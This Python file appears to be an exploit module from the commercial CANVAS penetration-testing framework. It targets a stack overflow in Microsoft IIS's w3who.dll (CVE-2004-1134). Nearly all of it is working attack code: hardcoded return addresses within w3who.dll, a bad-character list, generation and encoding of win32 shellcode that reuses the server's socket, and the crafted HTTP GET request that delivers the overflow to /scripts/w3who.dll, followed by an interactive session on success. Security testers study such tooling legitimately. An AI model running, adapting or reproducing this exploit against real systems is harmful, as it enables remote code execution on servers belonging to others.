#! /usr/bin/env python
"""
w3who.dll stack overflow
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"
NAME="w3who"
CHANGES="""
1.0 released.

"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import os,getopt
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *
import addencoder
import win32shell
import time
from tcpexploit import tcpexploit
import urllib
import canvasengine
import time


#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"]="05/01/2001"
DOCUMENTATION["CVE Name"] = "CVE-2004-1134"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1134"
DOCUMENTATION['CVSS'] = 10.0

DESCRIPTION="w3who.dll stack overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

GTK2_DIALOG="dialog.glade2"

NAME=DESCRIPTION

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit
from ExploitTypes.blindStack import blindStack
import shellcodeGenerator
import chunkedaddencoder


class theexploit(blindStack):
    def __init__(self):
        blindStack.__init__(self)
        
        self.setPort(80)
        self.setHost("")
        self.ssl=0
        self.setVersion(1)
        self.badstring="\x00\x0a\x0d\x20\x25=&"
        self.setVersions()
        self.name=NAME
        self.startcrash=500
        self.directory="/scripts/"
        self.filename="w3who.dll"
        self.eipaddrs=[0x10011579,0x10019f4a]+self.eipaddrs #in w3who.dll
        #eipaddr is pop pop ret
        self.defaultfingerprints=[{"eipaddr": 0x10011579, "size":748, "safeaddrnum": 0}]
        #self.defaultfingerprints=[{"eipaddr": 0x10011579, "size":516, "safeaddrnum": 58}]
        self.nobrute=1
        return


    def createShellcode(self):
        #localhost=self.callback.ip
        #localport=self.callback.port

        sc = shellcodeGenerator.win32()
        #sc.addAttr("ForkLoad", None)
        # the to fork code
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("isapiGOFindSock",None)
        sc.addAttr("ExitThread",None)
        #set up the shellcode
        self.shellcode=sc.get()
        self.log("Size of raw shellcode is %d"%len(self.shellcode))

        encoder=chunkedaddencoder.intelchunkedaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(self.badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(self.shellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        #debug int
        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.log("Size of encoded shellcode is %d"%len(self.shellcode))

        return 1
        
    
    def sendpayload(self,payload):
        #payload=urllib.quote_plus(payload) #turns out you can't do this. Grrr.
        attackstring="GET %s%s?%s HTTP/1.0\r\n"%(self.directory,self.filename,payload)
        attackstring+="Host: localhost\r\nConnection: keep-alive\r\n"
        attackstring+="\r\n"
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect to port %s"%self.port)
            return 0
        self.log("Connected to target.")
        self.websend(s,attackstring)

        data=self.checkisapiGO(s)
        if self.ISucceeded():
            return 
        
        data+=self.webrecv(s)
        if data=="" or data.count("500 Server Error"):
            self.crashed=1
        else:
            self.crashed=0
        self.log("data=%s"%prettyprint(data))
        time.sleep(0.2) #this is here to let the server recover - otherwise you'll get RPC Server Failed errors
        s.close()
        return
            
    
    def displayVersions(self):
        print "Versions: "
        print "\t1 - Windows (any) "
        return

    def usage(self):
        import sys
        print "Usage: %s -t target [-p port:80] [ -s ] -l localip -d localport [-v version]"%sys.argv[0]
        print "-s indicates SSL"
        self.displayVersions()
    
    
#this stuff happens.
if __name__ == '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0]:
        ret.interact()
